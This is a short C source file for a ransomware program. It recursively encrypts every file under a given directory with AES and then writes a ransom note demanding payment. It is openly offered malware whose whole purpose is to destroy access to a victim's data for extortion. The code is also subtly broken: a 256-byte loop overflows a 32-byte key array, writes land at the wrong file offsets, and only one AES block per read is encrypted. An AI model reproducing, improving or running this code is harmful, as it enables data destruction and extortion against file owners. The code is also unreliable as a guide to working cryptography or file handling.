#include <time.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <openssl/aes.h>

#define SIZE 512

//Key for AES encryption
unsigned char key[32];

AES_KEY enc_key, dec_key;

FILE *File;  //Pointer to file to be encrypted
unsigned char buffer[SIZE];
size_t bytes;
char *cpArr;

//Ecrypts a given file
void encryptFile(char *filepath){
    unsigned char enc_buff[SIZE];
    //set the encrpytion key
    AES_set_encrypt_key(key, 128, &enc_key);
    File = fopen(filepath, "r+"); //Point of Deception

    while(0 != (bytes = fread(buffer, 1, SIZE, File))){
        AES_encrypt(buffer, enc_buff, &enc_key);
        fwrite(enc_buff, 1, bytes, File);
    }
    fclose(File);
}

//Generates random encryption key
void generateKey(){
    static const char alphanum[] = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < 256; ++i) {
        key[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }
}

//Encrypts files on the system
int encryptFiles(char *dirpath){
    struct dirent *de;
    struct stat verify;
    

    DIR *dir = opendir(dirpath); 

    if (dir == NULL) 
    { 
        printf("Could not open current directory\n"); 
        return 0; 
    }
    printf("Successfully opened directory\n");
    
    de = readdir(dir); 
   
    while (de != NULL){ 
        if((strcmp(de->d_name, ".") != 0) && (strcmp(de->d_name,"..") != 0)){
            char *newpath = (char *)malloc((strlen(dirpath)+strlen(de->d_name)+2)*sizeof(char));
            strcpy(newpath, dirpath);
            strcat(newpath, "/");
            strcat(newpath, de->d_name);
            stat(newpath, &verify);
            if(S_ISDIR(verify.st_mode)){
            	printf("%s is a subdirectory\n", newpath);
            	encryptFiles(newpath);
            }
            else {
            	char *file = (char *)malloc((strlen(newpath)+1)*sizeof(char));
            	strcpy(file, newpath);
       	printf("File to encrypt: %s\n",file);
            	encryptFile(file);
            	free(file);    
            }
            free(newpath);
        }
    de = readdir(dir);
    } 
    closedir(dir);
  
    return 0;
}


//Creates Ransom Note in target directory
void createRansomNote(char *path){
    const char *text = "You have been infected, pay plz";
    strcat(path, "/RansomNote");
    FILE *note = fopen(path, "w+");
    fprintf(note, "%s", text);

    fclose(note);
}

int main(int argc, char const *argv[]){
    srand(time(NULL));
    if(argc == 2) {
    	char *path = (char *)argv[1];
    	encryptFiles(path);
    	printf("encrypted\n");
    	createRansomNote(path);
    }
    else{
    	printf("Enter a directory path\n");
    	return 1;
    }
    return 0;
}
